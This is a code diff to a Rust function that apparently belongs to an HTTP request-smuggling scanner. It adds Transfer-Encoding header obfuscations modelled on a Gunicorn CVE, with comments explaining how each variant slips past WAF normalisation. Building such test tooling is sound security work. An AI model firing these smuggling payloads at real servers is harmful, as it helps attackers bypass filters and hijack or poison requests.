@@ -75,6 +75,24 @@ pub fn te_obfuscations() -> Vec<String> {
         "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
         "Transfer-Encoding:\n chunked",
         "Transfer-Encoding:\r\n chunked",
+        // CVE-2024-1135 (Gunicorn) class — single header, multiple
+        // comma-separated encodings. WAFs normalising to the FIRST
+        // value see `identity` (whitelisted RFC 2616, skip), backend
+        // parses left-to-right, finds identity valid, processes body
+        // as the NEXT value (`chunked`). Different body length than
+        // WAF inspected. See: https://www.cve.news/cve-2024-1135/
+        "Transfer-Encoding: identity, chunked",
+        "Transfer-Encoding: identity,chunked",
+        "Transfer-Encoding: identity ,chunked",
+        "Transfer-Encoding: chunked, identity",
+        "Transfer-Encoding: chunked , identity",
+        // Three-element variant — some parsers stop after the first
+        // valid value, others scan to the last; both interpretations
+        // disagree with at least one WAF normaliser.
+        "Transfer-Encoding: identity, chunked, identity",
+        // Casing variant on identity itself — same logic, smaller
+        // overlap with case-folded WAF rules.
+        "Transfer-Encoding: Identity, chunked",
     ];
     let unicode_ws: Vec<String> = [
         '\u{00a0}', '\u{0085}', '\u{1680}', '\u{2000}', '\u{2001}', '\u{2002}', '\u{2003}',
